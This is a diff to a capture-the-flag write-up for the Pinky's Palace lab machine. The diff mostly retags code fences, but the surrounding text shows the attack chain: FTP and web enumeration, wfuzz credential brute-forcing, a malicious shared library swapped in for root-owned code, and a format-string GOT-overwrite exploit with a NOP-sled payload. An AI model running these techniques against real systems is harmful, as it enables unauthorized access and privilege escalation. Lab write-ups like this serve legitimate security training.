@@ -17,7 +17,7 @@ Without further ado, let's put on some [tunes](https://www.youtube.com/watch?v=S
   
 Enumeration  
 -----------  
-```  
+```
 PORT STATE SERVICE VERSION  
 21/tcp open ftp vsftpd 2.0.8 or later  
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)  
@@ -53,7 +53,7 @@ PORT STATE SERVICE VERSION
   
 Three interesting ports open. First stop we'll go for the FTP port.  
   
-```  
+```bash
 root@kali:~# pftp 157.203.11.95  
 Connected to 157.203.11.95.  
 220 Pinky's FTP  
@@ -279,7 +279,7 @@ So we've got some passwords, but we don't just want to brute-force every combina
 
 We collect a list of usernames from across the exposed web-pages and in the site and just run a quick test with a dummy PIN value.  The hope is that some difference in response will be yielded on incorrect PIN but correct credentials.
 
-```
+```bash
 root@kali:~/panther# cat usernames.txt 
 pinksec
 pinkadmin
@@ -288,7 +288,7 @@ pinky
 dpink
 ```
   
-```  
+```bash
 root@kali:~/panther# wfuzz -c -z file,./usernames.txt -z file,./pwds.db -d 'user=FUZZ&pass=FUZ2Z&pin=12345' --hh 45 http://192.168.0.74:8080/login.php  
   
 Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.  
@@ -312,7 +312,7 @@ Filtered Requests: 89
 Requests/sec.: 225.3289  
 ```  
 Lo and Behold, we have credentials!  Now we just need to brute-force the PIN. 
-```  
+```bash
 root@kali:~/panther# crunch 5 5 -f /usr/share/crunch/charset.lst numeric -o pin.txt  
 Crunch will now generate the following amount of data: 600000 bytes  
 0 MB  
@@ -405,7 +405,7 @@ Soon to be host of pinksec web application.
 ```  
 
 Looking at the disassembly reveals that what it's printing is in fact the result of some functions within the plt, indicating that there's a shared library actually containing these functions.
-```  
+```gdb
 pwndbg> disass main  
 Dump of assembler code for function main:  
 0x000006d0 <+0>: lea ecx,[esp+0x4]  
@@ -456,12 +456,12 @@ libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e11000)
 ```  
   
 /lib/libpinksec.so looks promising!  Just to confirm we have the correct library: 
-```  
+```gdb
 pwndbg> info symbol psoptin  
 psoptin in section .text of /lib/libpinksec.so  
 ```  
 If we find the library itself, we see it's world-writeable, so we can just replace it with a malicious copy and then run the binary to elevate our privileges.
-```  
+```bash
 pinksec@pinkys-palace:/tmp$ ls -la /lib/libpinksec.so  
 -rwxrwxrwx 1 root root 7136 May 14 23:52 /lib/libpinksec.so  
 ```
@@ -493,13 +493,13 @@ execve("/bin/sh", NULL, NULL);
   
 ```  
   Compiled it using the following:
-```  
+```bash 
 pinksec@pinkys-palace:/tmp$ gcc -c -fpic evillibpinksec.c  
 pinksec@pinkys-palace:/tmp$ gcc -shared -o evillibpinksec.so evillibpinksec.o  
 cp ./evillibpinksec.so /lib/libpinksec.so  
 ```  
 
-```  
+```bash
 pinksec@pinkys-palace:/tmp$ /home/pinksec/bin/pinksecd  
 ID: 1002  
 $ id  
@@ -522,7 +522,7 @@ permitted by applicable law.
 pinksecmanagement@pinkys-palace:~$  
 ```  
 Now we have the other SUID file worth investigating as we're now `pinksecmanagement`.
-```  
+```bash
 -rwsrwx--- 1 pinky pinksecmanagement 7396 May 14 19:06 /usr/local/bin/PSMCCLI  
 ```  
 Fuzzing reveals it echos out our arguments, so a classic format string vulnerability.
@@ -540,11 +540,11 @@ As a quick aside, I'm not a fan of doing these things blind, as debugging inside
 
 Firstly, the disassembly shows that a functions called `argshow` is called within `main`.  
   
-```  
+```bash
 0x0804852b <+71>: call 0x804849b <argshow>  
 ```  
 Disassembly doesn't show much interesting, it's the classic format string pwnable.
-```  
+```gdb
 pwndbg> disass argshow  
 Dump of assembler code for function argshow:  
 0x0804849b <+0>: push ebp  
@@ -573,7 +573,7 @@ End of assembler dump.
 ```  
 
 Running `checksec` locally reveals that almost all protections are disabled, so a  classic GOT overwrite into shellcode exploit will work!
-```  
+```gdb
 pwndbg> checksec  
 [*] '/root/panther/PSMCCLI'  
 Arch: i386-32-little  
@@ -593,7 +593,7 @@ We'll use the following template for writing two half-words to a target address.
 ```  
 
 Adjusting the values reveals that they're at 119 and 120.  I decided to overwrite the `putchar` GOT entry, as it is called after `printf`:
-```  
+```bash
 root@kali:~/panther# rabin2 -R PSMCCLI  
 [Relocations]  
 vaddr=0x08049ffc paddr=0x00000ffc type=SET_32 __gmon_start__  
@@ -607,8 +607,8 @@ vaddr=0x0804a01c paddr=0x0000101c type=SET_32 putchar
 ```  
 This means we'll be writing to the address `0x0804a01c`.  As for what I'm writing there, we'll need to dump the stack to see.  
 
-Creating a breakpoint allows us to view the stack and find the nopsled address.  We keep using the invoke script during these so memory offsets are equal.
-```  
+Creating a breakpoint allows us to view the stack and find the nopsled address.  We keep using the invoke script during these so memory offsets are equal.  The following are run on the remote machine:
+```gdb
 (gdb) break *argshow+55  
 Breakpoint 1 at 0x80484d2  
 (gdb) r $(python -c 'import sys; sys.stdout.write("AAAABBBB%0000000x%132$0x%0000000x%133$0x"+"\x90"*1000)')  
@@ -697,7 +697,7 @@ Last login: Tue May 15 04:32:07 2018 from 172.19.19.251
 pinky@pinkys-palace:~$  
 ```  
 We're almost at the finish line!  In the `pinky` user we find two sudo permissions. 
-```  
+```bash
 pinky@pinkys-palace:~$ sudo -l  
 Matching Defaults entries for pinky on pinkys-palace:  
 env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin  
